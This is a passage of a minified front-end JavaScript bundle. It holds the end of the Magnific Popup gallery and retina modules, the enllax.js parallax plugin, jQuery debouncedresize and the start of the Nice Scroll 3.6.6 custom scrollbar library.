					b !== c && (b === P ? R() : c === P && R(!0))
				}), w(b + "." + P, function() {
					R()
				})
			},
			getIframe: function(b, c) {
				var d = b.src,
					e = n.st.iframe;
				a.each(e.patterns, function() {
					if (d.indexOf(this.index) > -1) return this.id && (typeof this.id == "string" ? d = d.substr(d.lastIndexOf(this.id) + this.id.length, d.length) : d = this.id.call(this, d)), d = this.src.replace("%id%", d), !1
				});
				var f = {};
				return e.srcAction && (f[e.srcAction] = d), n._parseMarkup(c, f, b), n.updateStatus("ready"), c
			}
		}
	});
	var S = function(a) {
			var b = n.items.length;
			return a > b - 1 ? a - b : a < 0 ? b + a : a
		},
		T = function(a, b, c) {
			return a.replace(/%curr%/gi, b + 1).replace(/%total%/gi, c)
		};
	a.magnificPopup.registerModule("gallery", {
		options: {
			enabled: !1,
			arrowMarkup: '<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',
			preload: [0, 2],
			navigateByImgClick: !0,
			arrows: !0,
			tPrev: "Previous (Left arrow key)",
			tNext: "Next (Right arrow key)",
			tCounter: "%curr% of %total%"
		},
		proto: {
			initGallery: function() {
				var c = n.st.gallery,
					d = ".mfp-gallery";
				n.direction = !0;
				if (!c || !c.enabled) return !1;
				u += " mfp-gallery", w(g + d, function() {
					c.navigateByImgClick && n.wrap.on("click" + d, ".mfp-img", function() {
						if (n.items.length > 1) return n.next(), !1
					}), s.on("keydown" + d, function(a) {
						a.keyCode === 37 ? n.prev() : a.keyCode === 39 && n.next()
					})
				}), w("UpdateStatus" + d, function(a, b) {
					b.text && (b.text = T(b.text, n.currItem.index, n.items.length))
				}), w(f + d, function(a, b, d, e) {
					var f = n.items.length;
					d.counter = f > 1 ? T(c.tCounter, e.index, f) : ""
				}), w("BuildControls" + d, function() {
					if (n.items.length > 1 && c.arrows && !n.arrowLeft) {
						var b = c.arrowMarkup,
							d = n.arrowLeft = a(b.replace(/%title%/gi, c.tPrev).replace(/%dir%/gi, "left")).addClass(m),
							e = n.arrowRight = a(b.replace(/%title%/gi, c.tNext).replace(/%dir%/gi, "right")).addClass(m);
						d.click(function() {
							n.prev()
						}), e.click(function() {
							n.next()
						}), n.container.append(d.add(e))
					}
				}), w(h + d, function() {
					n._preloadTimeout && clearTimeout(n._preloadTimeout), n._preloadTimeout = setTimeout(function() {
						n.preloadNearbyImages(), n._preloadTimeout = null
					}, 16)
				}), w(b + d, function() {
					s.off(d), n.wrap.off("click" + d), n.arrowRight = n.arrowLeft = null
				})
			},
			next: function() {
				n.direction = !0, n.index = S(n.index + 1), n.updateItemHTML()
			},
			prev: function() {
				n.direction = !1, n.index = S(n.index - 1), n.updateItemHTML()
			},
			goTo: function(a) {
				n.direction = a >= n.index, n.index = a, n.updateItemHTML()
			},
			preloadNearbyImages: function() {
				var a = n.st.gallery.preload,
					b = Math.min(a[0], n.items.length),
					c = Math.min(a[1], n.items.length),
					d;
				for (d = 1; d <= (n.direction ? c : b); d++) n._preloadItem(n.index + d);
				for (d = 1; d <= (n.direction ? b : c); d++) n._preloadItem(n.index - d)
			},
			_preloadItem: function(b) {
				b = S(b);
				if (n.items[b].preloaded) return;
				var c = n.items[b];
				c.parsed || (c = n.parseEl(b)), y("LazyLoad", c), c.type === "image" && (c.img = a('<img class="mfp-img" />').on("load.mfploader", function() {
					c.hasSize = !0
				}).on("error.mfploader", function() {
					c.hasSize = !0, c.loadError = !0, y("LazyLoadError", c)
				}).attr("src", c.src)), c.preloaded = !0
			}
		}
	});
	var U = "retina";
	a.magnificPopup.registerModule(U, {
		options: {
			replaceSrc: function(a) {
				return a.src.replace(/\.\w+$/, function(a) {
					return "@2x" + a
				})
			},
			ratio: 1
		},
		proto: {
			initRetina: function() {
				if (window.devicePixelRatio > 1) {
					var a = n.st.retina,
						b = a.ratio;
					b = isNaN(b) ? b() : b, b > 1 && (w("ImageHasSize." + U, function(a, c) {
						c.img.css({
							"max-width": c.img[0].naturalWidth / b,
							width: "100%"
						})
					}), w("ElementParse." + U, function(c, d) {
						d.src = a.replaceSrc(d, b)
					}))
				}
			}
		}
	}), A()
})


/**
 * Parallax 
 * 
 * enllax.js 
 * 
 * 1.1.0 | copyright 2015, MMK Jony | https://github.com/mmkjony/enllax.js
 */
! function(t) {
	"use strict";
	t.fn.enllax = function(r) {
		var a = t(window).height(),
			n = t(document).height(),
			o = t.extend({
				ratio: 0,
				type: "background",
				direction: "vertical"
			}, r),
			e = t("[data-enllax-ratio]");
		e.each(function() {
			var r, e, s, i = t(this),
				c = i.offset().top,
				l = i.outerHeight(),
				p = i.data("enllax-ratio"),
				d = i.data("enllax-type"),
				x = i.data("enllax-direction");
			r = p ? p : o.ratio, e = d ? d : o.type, s = x ? x : o.direction;
			var f = Math.round(c * r),
				u = Math.round((c - a / 2 + l) * r);
			"background" == e ? "vertical" == s ? i.css({
				"background-position": "center " + -f + "px"
			}) : "horizontal" == s && i.css({
				"background-position": -f + "px center"
			}) : "foreground" == e && ("vertical" == s ? i.css({
				"-webkit-transform": "translateY(" + u + "px)",
				"-moz-transform": "translateY(" + u + "px)",
				transform: "translateY(" + u + "px)"
			}) : "horizontal" == s && i.css({
				"-webkit-transform": "translateX(" + u + "px)",
				"-moz-transform": "translateX(" + u + "px)",
				transform: "translateX(" + u + "px)"
			})), t(window).on("scroll", function() {
				var o = t(this).scrollTop();
				f = Math.round((c - o) * r), u = Math.round((c - a / 2 + l - o) * r), "background" == e ? "vertical" == s ? i.css({
					"background-position": "center " + -f + "px"
				}) : "horizontal" == s && i.css({
					"background-position": -f + "px center"
				}) : "foreground" == e && n > o && ("vertical" == s ? i.css({
					"-webkit-transform": "translateY(" + u + "px)",
					"-moz-transform": "translateY(" + u + "px)",
					transform: "translateY(" + u + "px)"
				}) : "horizontal" == s && i.css({
					"-webkit-transform": "translateX(" + u + "px)",
					"-moz-transform": "translateX(" + u + "px)",
					transform: "translateX(" + u + "px)"
				}))
			})
		})
	}
}(jQuery);


/**
 * Resize
 * 
 * debouncedresize
 * 
 * @louis_remi | https://github.com/louisremi/jquery-smartresize | Licensed under the MIT license.
 */
(function(e) {
	var t = e.event,
		n, r;
	n = t.special.debouncedresize = {
		setup: function() {
			e(this).on("resize", n.handler)
		},
		teardown: function() {
			e(this).off("resize", n.handler)
		},
		handler: function(e, i) {
			var s = this,
				o = arguments,
				u = function() {
					e.type = "debouncedresize";
					t.dispatch.apply(s, o)
				};
			if (r) {
				clearTimeout(r)
			}
			i ? u() : r = setTimeout(u, n.threshold)
		},
		threshold: 150
	}
})(jQuery);


/**
 * Scroll
 * 
 * Nice Scroll
 * 
 * 3.6.6 | InuYaksa | 2015 MIT | http://nicescroll.areaaperta.com
 */
! function(e) {
	"function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? module.exports = e(require("jquery")) : e(jQuery)
}(function(e) {
	"use strict";

	function o() {
		var e = document.getElementsByTagName("script"),
			o = e.length ? e[e.length - 1].src.split("?")[0] : "";
		return o.split("/").length > 0 ? o.split("/").slice(0, -1).join("/") + "/" : ""
	}

	function t(e, o, t) {
		for (var r = 0; r < o.length; r++) t(e, o[r])
	}
	var r = !1,
		i = !1,
		n = 0,
		s = 2e3,
		l = 0,
		a = e,
		c = ["webkit", "ms", "moz", "o"],
		d = window.requestAnimationFrame || !1,
		u = window.cancelAnimationFrame || !1;
	if (!d)
		for (var h in c) {
			var p = c[h];
			d || (d = window[p + "RequestAnimationFrame"]), u || (u = window[p + "CancelAnimationFrame"] || window[p + "CancelRequestAnimationFrame"])
		}
	var m = window.MutationObserver || window.WebKitMutationObserver || !1,
		f = {
			zindex: "auto",
			cursoropacitymin: 0,
			cursoropacitymax: 1,
			cursorcolor: "#424242",
			cursorwidth: "5px",
			cursorborder: "1px solid #fff",
			cursorborderradius: "5px",
			scrollspeed: 60,
			mousescrollstep: 24,
			touchbehavior: !1,
			hwacceleration: !0,
			usetransition: !0,
			boxzoom: !1,
			dblclickzoom: !0,
			gesturezoom: !0,
			grabcursorenabled: !0,
			autohidemode: !0,
			background: "",
			iframeautoresize: !0,
			cursorminheight: 32,
			preservenativescrolling: !0,
			railoffset: !1,
			railhoffset: !1,
			bouncescroll: !0,
			spacebarenabled: !0,
			railpadding: {
				top: 0,
				right: 0,
				left: 0,
				bottom: 0
			},
			disableoutline: !0,
			horizrailenabled: !0,
			railalign: "right",
			railvalign: "bottom",
			enabletranslate3d: !0,
			enablemousewheel: !0,
			enablekeyboard: !0,
			smoothscroll: !0,
			sensitiverail: !0,
			enablemouselockapi: !0,
			cursorfixedheight: !1,
			directionlockdeadzone: 6,
			hidecursordelay: 400,
			nativeparentscrolling: !0,
			enablescrollonselection: !0,
			overflowx: !0,
			overflowy: !0,
			cursordragspeed: .3,
			rtlmode: "auto",
			cursordragontouch: !1,
			oneaxismousemode: "auto",
			scriptpath: o(),
			preventmultitouchscrolling: !0
		},
		g = !1,
		w = function() {
			function e() {
				var e = ["-webkit-grab", "-moz-grab", "grab"];
				(n.ischrome && !n.ischrome22 || n.isie) && (e = []);
				for (var o = 0; o < e.length; o++) {
					var r = e[o];
					if (t.cursor = r, t.cursor == r) return r
				}
				return "url(//mail.google.com/mail/images/2/openhand.cur),n-resize"
			}
			if (g) return g;
			var o = document.createElement("DIV"),
				t = o.style,
				r = navigator.userAgent,
				i = navigator.platform,
				n = {};
			n.haspointerlock = "pointerLockElement" in document || "webkitPointerLockElement" in document || "mozPointerLockElement" in document, n.isopera = "opera" in window, n.isopera12 = n.isopera && "getUserMedia" in navigator, n.isoperamini = "[object OperaMini]" === Object.prototype.toString.call(window.operamini), n.isie = "all" in document && "attachEvent" in o && !n.isopera, n.isieold = n.isie && !("msInterpolationMode" in t), n.isie7 = n.isie && !n.isieold && (!("documentMode" in document) || 7 == document.documentMode), n.isie8 = n.isie && "documentMode" in document && 8 == document.documentMode, n.isie9 = n.isie && "performance" in window && document.documentMode >= 9, n.isie10 = n.isie && "performance" in window && 10 == document.documentMode, n.isie11 = "msRequestFullscreen" in o && document.documentMode >= 11, n.isieedge = navigator.userAgent.match(/Edge\/12\./), n.isie9mobile = /iemobile.9/i.test(r), n.isie9mobile && (n.isie9 = !1), n.isie7mobile = !n.isie9mobile && n.isie7 && /iemobile/i.test(r), n.ismozilla = "MozAppearance" in t, n.iswebkit = "WebkitAppearance" in t, n.ischrome = "chrome" in window, n.ischrome22 = n.ischrome && n.haspointerlock, n.ischrome26 = n.ischrome && "transition" in t, n.cantouch = "ontouchstart" in document.documentElement || "ontouchstart" in window, n.hasmstouch = window.MSPointerEvent || !1, n.hasw3ctouch = (window.PointerEvent || !1) && (navigator.MaxTouchPoints > 0 || navigator.msMaxTouchPoints > 0), n.ismac = /^mac$/i.test(i), n.isios = n.cantouch && /iphone|ipad|ipod/i.test(i), n.isios4 = n.isios && !("seal" in Object), n.isios7 = n.isios && "webkitHidden" in document, n.isandroid = /android/i.test(r), n.haseventlistener = "addEventListener" in o, n.trstyle = !1, n.hastransform = !1, n.hastranslate3d = !1, n.transitionstyle = !1, n.hastransition = !1, n.transitionend = !1;
			var s, l = ["transform", "msTransform", "webkitTransform", "MozTransform", "OTransform"];
			for (s = 0; s < l.length; s++)
				if ("undefined" != typeof t[l[s]]) {
					n.trstyle = l[s];
					break
				}
			n.hastransform = !!n.trstyle, n.hastransform && (t[n.trstyle] = "translate3d(1px,2px,3px)", n.hastranslate3d = /translate3d/.test(t[n.trstyle])), n.transitionstyle = !1, n.prefixstyle = "", n.transitionend = !1, l = ["transition", "webkitTransition", "msTransition", "MozTransition", "OTransition", "OTransition", "KhtmlTransition"];
			var a = ["", "-webkit-", "-ms-", "-moz-", "-o-", "-o", "-khtml-"],
				c = ["transitionend", "webkitTransitionEnd", "msTransitionEnd", "transitionend", "otransitionend", "oTransitionEnd", "KhtmlTransitionEnd"];
			for (s = 0; s < l.length; s++)
				if (l[s] in t) {
					n.transitionstyle = l[s], n.prefixstyle = a[s], n.transitionend = c[s];
					break
				}
			return n.ischrome26 && (n.prefixstyle = a[1]), n.hastransition = n.transitionstyle, n.cursorgrabvalue = e(), n.hasmousecapture = "setCapture" in o, n.hasMutationObserver = m !== !1, o = null, g = n, n
		},
		v = function(e, o) {
			function t() {
				var e = v.doc.css(x.trstyle);
				return e && "matrix" == e.substr(0, 6) ? e.replace(/^.*\((.*)\)$/g, "$1").replace(/px/g, "").split(/, +/) : !1
			}

			function c() {
				var e = v.win;
				if ("zIndex" in e) return e.zIndex();
				for (; e.length > 0;) {
					if (9 == e[0].nodeType) return !1;
					var o = e.css("zIndex");
					if (!isNaN(o) && 0 != o) return parseInt(o);
					e = e.parent()
				}
				return !1
			}

			function h(e, o, t) {
				var r = e.css(o),
					i = parseFloat(r);
				if (isNaN(i)) {
					i = k[r] || 0;
					var n = 3 == i ? t ? v.win.outerHeight() - v.win.innerHeight() : v.win.outerWidth() - v.win.innerWidth() : 1;
					return v.isie8 && i && (i += 1), n ? i : 0
				}
				return i
			}

			function p(e, o, t, r) {
				v._bind(e, o, function(r) {
					var r = r ? r : window.event,
						i = {
							original: r,
							target: r.target || r.srcElement,
							type: "wheel",
							deltaMode: "MozMousePixelScroll" == r.type ? 0 : 1,
							deltaX: 0,
							deltaZ: 0,
							preventDefault: function() {
								return r.preventDefault ?  r.preventDefault() : r.returnValue = !1, !1
							},
							stopImmediatePropagation: function() {
								r.stopImmediatePropagation ? r.stopImmediatePropagation() : r.cancelBubble = !0
							}
						};
					return "mousewheel" == o ? (i.deltaY = -1 / 40 * r.wheelDelta, r.wheelDeltaX && (i.deltaX = -1 / 40 * r.wheelDeltaX)) : i.deltaY = r.detail, t.call(e, i)
				}, r)
			}

			function g(e, o, t) {
				var r, i;
				if (0 == e.deltaMode ? (r = -Math.floor(e.deltaX * (v.opt.mousescrollstep / 54)), i = -Math.floor(e.deltaY * (v.opt.mousescrollstep / 54))) : 1 == e.deltaMode && (r = -Math.floor(e.deltaX * v.opt.mousescrollstep), i = -Math.floor(e.deltaY * v.opt.mousescrollstep)), o && v.opt.oneaxismousemode && 0 == r && i && (r = i, i = 0, t)) {
					var n = 0 > r ? v.getScrollLeft() >= v.page.maxw : v.getScrollLeft() <= 0;
					n && (i = r, r = 0)
				}
				if (r && (v.scrollmom && v.scrollmom.stop(), v.lastdeltax += r, v.debounced("mousewheelx", function() {
						var e = v.lastdeltax;
						v.lastdeltax = 0, v.rail.drag || v.doScrollLeftBy(e)
					}, 15)), i) {
					if (v.opt.nativeparentscrolling && t && !v.ispage && !v.zoomactive)
						if (0 > i) {
							if (v.getScrollTop() >= v.page.maxh) return !0
						} else if (v.getScrollTop() <= 0) return !0;
					v.scrollmom && v.scrollmom.stop(), v.lastdeltay += i, v.debounced("mousewheely", function() {
						var e = v.lastdeltay;
						v.lastdeltay = 0, v.rail.drag || v.doScrollBy(e)
					}, 15)
				}
				return e.stopImmediatePropagation(), e.preventDefault()
			}
			var v = this;
			if (this.version = "3.6.6", this.name = "nicescroll", this.me = o, this.opt = {
					doc: a("body"),
					win: !1
				}, a.extend(this.opt, f), this.opt.snapbackspeed = 80, e)
				for (var y in v.opt) "undefined" != typeof e[y] && (v.opt[y] = e[y]);
			this.doc = v.opt.doc, this.iddoc = this.doc && this.doc[0] ? this.doc[0].id || "" : "", this.ispage = /^BODY|HTML/.test(v.opt.win ? v.opt.win[0].nodeName : this.doc[0].nodeName), this.haswrapper = v.opt.win !== !1, this.win = v.opt.win || (this.ispage ? a(window) : this.doc), this.docscroll = this.ispage && !this.haswrapper ? a(window) : this.win, this.body = a("body"), this.viewport = !1, this.isfixed = !1, this.iframe = !1, this.isiframe = "IFRAME" == this.doc[0].nodeName && "IFRAME" == this.win[0].nodeName, this.istextarea = "TEXTAREA" == this.win[0].nodeName, this.forcescreen = !1, this.canshowonmouseevent = "scroll" != v.opt.autohidemode, this.onmousedown = !1, this.onmouseup = !1, this.onmousemove = !1, this.onmousewheel = !1, this.onkeypress = !1, this.ongesturezoom = !1, this.onclick = !1, this.onscrollstart = !1, this.onscrollend = !1, this.onscrollcancel = !1, this.onzoomin = !1, this.onzoomout = !1, this.view = !1, this.page = !1, this.scroll = {
				x: 0,
				y: 0
			}, this.scrollratio = {
				x: 0,
				y: 0
			}, this.cursorheight = 20, this.scrollvaluemax = 0, this.isrtlmode = "auto" == this.opt.rtlmode ? "rtl" == (this.win[0] == window ? this.body : this.win).css("direction") : this.opt.rtlmode === !0, this.scrollrunning = !1, this.scrollmom = !1, this.observer = !1, this.observerremover = !1, this.observerbody = !1;
			do this.id = "ascrail" + s++; while (document.getElementById(this.id));
			this.rail = !1, this.cursor = !1, this.cursorfreezed = !1, this.selectiondrag = !1, this.zoom = !1, this.zoomactive = !1, this.hasfocus = !1, this.hasmousefocus = !1, this.visibility = !0, this.railslocked = !1, this.locked = !1, this.hidden = !1, this.cursoractive = !0, this.wheelprevented = !1, this.overflowx = v.opt.overflowx, this.overflowy = v.opt.overflowy, this.nativescrollingarea = !1, this.checkarea = 0, this.events = [], this.saved = {}, this.delaylist = {}, this.synclist = {}, this.lastdeltax = 0, this.lastdeltay = 0, this.detected = w();
			var x = a.extend({}, this.detected);
			this.canhwscroll = x.hastransform && v.opt.hwacceleration, this.ishwscroll = this.canhwscroll && v.haswrapper, this.hasreversehr = this.isrtlmode && !x.iswebkit, this.istouchcapable = !1, !x.cantouch || x.isios || x.isandroid || !x.iswebkit && !x.ismozilla || (this.istouchcapable = !0, x.cantouch = !1), v.opt.enablemouselockapi || (x.hasmousecapture = !1, x.haspointerlock = !1), this.debounced = function(e, o, t) {
				var r = v.delaylist[e];
				v.delaylist[e] = o, r || (v.debouncedelayed = setTimeout(function() {
					if (v) {
						var o = v.delaylist[e];
						v.delaylist[e] = !1, o.call(v)
					}
				}, t))
			};
			var S = !1;
			this.synched = function(e, o) {
				function t() {
					S || (d(function() {
						S = !1;
						for (var e in v.synclist) {
							var o = v.synclist[e];
							o && o.call(v), v.synclist[e] = !1
						}
					}), S = !0)
				}
				return v.synclist[e] = o, t(), e
			}, this.unsynched = function(e) {
				v.synclist[e] && (v.synclist[e] = !1)
			}, this.css = function(e, o) {
				for (var t in o) v.saved.css.push([e, t, e.css(t)]), e.css(t, o[t])
			}, this.scrollTop = function(e) {
				return "undefined" == typeof e ? v.getScrollTop() : v.setScrollTop(e)
			}, this.scrollLeft = function(e) {
				return "undefined" == typeof e ? v.getScrollLeft() : v.setScrollLeft(e)
			};
			var z = function(e, o, t, r, i, n, s) {
				this.st = e, this.ed = o, this.spd = t, this.p1 = r || 0, this.p2 = i || 1, this.p3 = n || 0, this.p4 = s || 1, this.ts = (new Date).getTime(), this.df = this.ed - this.st
			};
			if (z.prototype = {
					B2: function(e) {
						return 3 * e * e * (1 - e)
					},
					B3: function(e) {
						return 3 * e * (1 - e) * (1 - e)
					},
					B4: function(e) {
						return (1 - e) * (1 - e) * (1 - e)
					},
					getNow: function() {
						var e = (new Date).getTime(),
							o = 1 - (e - this.ts) / this.spd,
							t = this.B2(o) + this.B3(o) + this.B4(o);
						return 0 > o ? this.ed : this.st + Math.round(this.df * t)
					},
					update: function(e, o) {
						return this.st = this.getNow(), this.ed = e, this.spd = o, this.ts = (new Date).getTime(), this.df = this.ed - this.st, this
					}
				}, this.ishwscroll) {
				this.doc.translate = {
					x: 0,
					y: 0,
					tx: "0px",
					ty: "0px"
				}, x.hastranslate3d && x.isios && this.doc.css("-webkit-backface-visibility", "hidden"), this.getScrollTop = function(e) {
					if (!e) {
						var o = t();
						if (o) return 16 == o.length ? -o[13] : -o[5];
						if (v.timerscroll && v.timerscroll.bz) return v.timerscroll.bz.getNow()
					}
					return v.doc.translate.y
				}, this.getScrollLeft = function(e) {
					if (!e) {
						var o = t();
						if (o) return 16 == o.length ? -o[12] : -o[4];
						if (v.timerscroll && v.timerscroll.bh) return v.timerscroll.bh.getNow()
					}
					return v.doc.translate.x
				}, this.notifyScrollEvent = function(e) {
					var o = document.createEvent("UIEvents");
					o.initUIEvent("scroll", !1, !0, window, 1), o.niceevent = !0, e.dispatchEvent(o)
				};
				var T = this.isrtlmode ? 1 : -1;
				x.hastranslate3d && v.opt.enabletranslate3d ? (this.setScrollTop = function(e, o) {
					v.doc.translate.y = e, v.doc.translate.ty = -1 * e + "px", v.doc.css(x.trstyle, "translate3d(" + v.doc.translate.tx + "," + v.doc.translate.ty + ",0px)"), o || v.notifyScrollEvent(v.win[0])
				}, this.setScrollLeft = function(e, o) {
					v.doc.translate.x = e, v.doc.translate.tx = e * T + "px", v.doc.css(x.trstyle, "translate3d(" + v.doc.translate.tx + "," + v.doc.translate.ty + ",0px)"), o || v.notifyScrollEvent(v.win[0])
				}) : (this.setScrollTop = function(e, o) {
					v.doc.translate.y = e, v.doc.translate.ty = -1 * e + "px", v.doc.css(x.trstyle, "translate(" + v.doc.translate.tx + "," + v.doc.translate.ty + ")"), o || v.notifyScrollEvent(v.win[0])
				}, this.setScrollLeft = function(e, o) {
					v.doc.translate.x = e, v.doc.translate.tx = e * T + "px", v.doc.css(x.trstyle, "translate(" + v.doc.translate.tx + "," + v.doc.translate.ty + ")"), o || v.notifyScrollEvent(v.win[0])
				})
			} else this.getScrollTop = function() {
				return v.docscroll.scrollTop()
			}, this.setScrollTop = function(e) {
				return setTimeout(function() {
					v.docscroll.scrollTop(e)
				}, 1)
			}, this.getScrollLeft = function() {
				return v.detected.ismozilla && v.isrtlmode ? Math.abs(v.docscroll.scrollLeft()) : v.docscroll.scrollLeft()
			}, this.setScrollLeft = function(e) {
				return setTimeout(function() {
					v.docscroll.scrollLeft(v.detected.ismozilla && v.isrtlmode ? -e : e)
				}, 1)
			};
			this.getTarget = function(e) {
				return e ? e.target ? e.target : e.srcElement ? e.srcElement : !1 : !1
			}, this.hasParent = function(e, o) {
				if (!e) return !1;
				for (var t = e.target || e.srcElement || e || !1; t && t.id != o;) t = t.parentNode || !1;
				return t !== !1
			};
			var k = {
				thin: 1,
				medium: 3,
				thick: 5
			};
			this.getDocumentScrollOffset = function() {
				return {
					top: window.pageYOffset || document.documentElement.scrollTop,
					left: window.pageXOffset || document.documentElement.scrollLeft
				}
			}, this.getOffset = function() {
				if (v.isfixed) {
					var e = v.win.offset(),
						o = v.getDocumentScrollOffset();
					return e.top -= o.top, e.left -= o.left, e
				}
				var t = v.win.offset();
				if (!v.viewport) return t;
				var r = v.viewport.offset();
				return {
					top: t.top - r.top,
					left: t.left - r.left
				}
			}, this.updateScrollBar = function(e) {
				if (v.ishwscroll) v.rail.css({
					height: v.win.innerHeight() - (v.opt.railpadding.top + v.opt.railpadding.bottom)
				}), v.railh && v.railh.css({
					width: v.win.innerWidth() - (v.opt.railpadding.left + v.opt.railpadding.right)
				});
				else {
					var o = v.getOffset(),
						t = {
							top: o.top,
							left: o.left - (v.opt.railpadding.left + v.opt.railpadding.right)
						};
					t.top += h(v.win, "border-top-width", !0), t.left += v.rail.align ? v.win.outerWidth() - h(v.win, "border-right-width") - v.rail.width : h(v.win, "border-left-width");
					var r = v.opt.railoffset;
					if (r && (r.top && (t.top += r.top), r.left && (t.left += r.left)), v.railslocked || v.rail.css({
							top: t.top,
							left: t.left,
							height: (e ? e.h : v.win.innerHeight()) - (v.opt.railpadding.top + v.opt.railpadding.bottom)
						}), v.zoom && v.zoom.css({
							top: t.top + 1,
							left: 1 == v.rail.align ? t.left - 20 : t.left + v.rail.width + 4
						}), v.railh && !v.railslocked) {
						var t = {
								top: o.top,
								left: o.left
							},
							r = v.opt.railhoffset;
						r && (r.top && (t.top += r.top), r.left && (t.left += r.left));
						var i = v.railh.align ? t.top + h(v.win, "border-top-width", !0) + v.win.innerHeight() - v.railh.height : t.top + h(v.win, "border-top-width", !0),
							n = t.left + h(v.win, "border-left-width");
						v.railh.css({
							top: i - (v.opt.railpadding.top + v.opt.railpadding.bottom),
							left: n,
							width: v.railh.width
						})
					}
				}
			}, this.doRailClick = function(e, o, t) {
				var r, i, n, s;
				v.railslocked || (v.cancelEvent(e), o ? (r = t ? v.doScrollLeft : v.doScrollTop, n = t ? (e.pageX - v.railh.offset().left - v.cursorwidth / 2) * v.scrollratio.x : (e.pageY - v.rail.offset().top - v.cursorheight / 2) * v.scrollratio.y, r(n)) : (r = t ? v.doScrollLeftBy : v.doScrollBy, n = t ? v.scroll.x : v.scroll.y, s = t ? e.pageX - v.railh.offset().left : e.pageY - v.rail.offset().top, i = t ? v.view.w : v.view.h, r(n >= s ? i : -i)))
			}, v.hasanimationframe = d, v.hascancelanimationframe = u, v.hasanimationframe ? v.hascancelanimationframe || (u = function() {
				v.cancelAnimationFrame = !0
			}) : (d = function(e) {
				return setTimeout(e, 15 - Math.floor(+new Date / 1e3) % 16)
			}, u = clearInterval), this.init = function() {
				if (v.saved.css = [], x.isie7mobile) return !0;
				if (x.isoperamini) return !0;
				if (x.hasmstouch && v.css(v.ispage ? a("html") : v.win, {
						"-ms-touch-action": "none"
					}), v.zindex = "auto", v.ispage || "auto" != v.opt.zindex ? v.zindex = v.opt.zindex : v.zindex = c() || "auto", v.ispage || "auto" == v.zindex || v.zindex > l && (l = v.zindex), v.isie && 0 == v.zindex && "auto" == v.opt.zindex && (v.zindex = "auto"), !v.ispage || !x.cantouch && !x.isieold && !x.isie9mobile) {
					var e = v.docscroll;
					v.ispage && (e = v.haswrapper ? v.win : v.doc), x.isie9mobile || v.css(e, {
						"overflow-y": "hidden"
					}), v.ispage && x.isie7 && ("BODY" == v.doc[0].nodeName ? v.css(a("html"), {
						"overflow-y": "hidden"
					}) : "HTML" == v.doc[0].nodeName && v.css(a("body"), {
						"overflow-y": "hidden"
					})), !x.isios || v.ispage || v.haswrapper || v.css(a("body"), {
						"-webkit-overflow-scrolling": "touch"
					});
					var o = a(document.createElement("div"));
					o.css({
						position: "relative",
						top: 0,
						"float": "right",
						width: v.opt.cursorwidth,
						height: "0px",
						"background-color": v.opt.cursorcolor,
						border: v.opt.cursorborder,
						"background-clip": "padding-box",
						"-webkit-border-radius": v.opt.cursorborderradius,
						"-moz-border-radius": v.opt.cursorborderradius,
						"border-radius": v.opt.cursorborderradius
					}), o.hborder = parseFloat(o.outerHeight() - o.innerHeight()), o.addClass("nicescroll-cursors"), v.cursor = o;
					var t = a(document.createElement("div"));
					t.attr("id", v.id), t.addClass("nicescroll-rails nicescroll-rails-vr");
					var s, d, u = ["left", "right", "top", "bottom"];
					for (var h in u) d = u[h], s = v.opt.railpadding[d], s ? t.css("padding-" + d, s + "px") : v.opt.railpadding[d] = 0;
					t.append(o), t.width = Math.max(parseFloat(v.opt.cursorwidth), o.outerWidth()), t.css({
						width: t.width + "px",
						zIndex: v.zindex,
						background: v.opt.background,
						cursor: "default"
					}), t.visibility = !0, t.scrollable = !0, t.align = "left" == v.opt.railalign ? 0 : 1, v.rail = t, v.rail.drag = !1;
					var p = !1;
					!v.opt.boxzoom || v.ispage || x.isieold || (p = document.createElement("div"), v.bind(p, "click", v.doZoom), v.bind(p, "mouseenter", function() {
						v.zoom.css("opacity", v.opt.cursoropacitymax)
					}), v.bind(p, "mouseleave", function() {
						v.zoom.css("opacity", v.opt.cursoropacitymin)
					}), v.zoom = a(p), v.zoom.css({
						cursor: "pointer",
						"z-index": v.zindex,
						backgroundImage: "url(" + v.opt.scriptpath + "zoomico.png)",
						height: 18,
						width: 18,
						backgroundPosition: "0px 0px"
					}), v.opt.dblclickzoom && v.bind(v.win, "dblclick", v.doZoom), x.cantouch && v.opt.gesturezoom && (v.ongesturezoom = function(e) {
						return e.scale > 1.5 && v.doZoomIn(e), e.scale < .8 && v.doZoomOut(e), v.cancelEvent(e)
					}, v.bind(v.win, "gestureend", v.ongesturezoom))), v.railh = !1;
					var f;
					if (v.opt.horizrailenabled) {
						v.css(e, {
							"overflow-x": "hidden"
						});
						var o = a(document.createElement("div"));
						o.css({
							position: "absolute",
							top: 0,
							height: v.opt.cursorwidth,
							width: "0px",
							"background-color": v.opt.cursorcolor,
							border: v.opt.cursorborder,
							"background-clip": "padding-box",
							"-webkit-border-radius": v.opt.cursorborderradius,
							"-moz-border-radius": v.opt.cursorborderradius,
							"border-radius": v.opt.cursorborderradius
						}), x.isieold && o.css({
							overflow: "hidden"
						}), o.wborder = parseFloat(o.outerWidth() - o.innerWidth()), o.addClass("nicescroll-cursors"), v.cursorh = o, f = a(document.createElement("div")), f.attr("id", v.id + "-hr"), f.addClass("nicescroll-rails nicescroll-rails-hr"), f.height = Math.max(parseFloat(v.opt.cursorwidth), o.outerHeight()), f.css({
							height: f.height + "px",
							zIndex: v.zindex,
							background: v.opt.background
						}), f.append(o), f.visibility = !0, f.scrollable = !0, f.align = "top" == v.opt.railvalign ? 0 : 1, v.railh = f, v.railh.drag = !1
					}
					if (v.ispage) t.css({
						position: "fixed",
						top: "0px",
						height: "100%"
					}), t.align ? t.css({
						right: "0px"
					}) : t.css({
						left: "0px"
					}), v.body.append(t), v.railh && (f.css({
						position: "fixed",
						left: "0px",
						width: "100%"
					}), f.align ? f.css({
						bottom: "0px"
					}) : f.css({
						top: "0px"
					}), v.body.append(f));
					else {
						if (v.ishwscroll) {
							"static" == v.win.css("position") && v.css(v.win, {
								position: "relative"
							});
							var g = "HTML" == v.win[0].nodeName ? v.body : v.win;
							a(g).scrollTop(0).scrollLeft(0), v.zoom && (v.zoom.css({
								position: "absolute",
								top: 1,
								right: 0,
								"margin-right": t.width + 4
							}), g.append(v.zoom)), t.css({
								position: "absolute",
								top: 0
							}), t.align ? t.css({
								right: 0
							}) : t.css({
								left: 0
							}), g.append(t), f && (f.css({
								position: "absolute",
								left: 0,
								bottom: 0
							}), f.align ? f.css({
								bottom: 0
							}) : f.css({
								top: 0
							}), g.append(f))
						} else {
							v.isfixed = "fixed" == v.win.css("position");
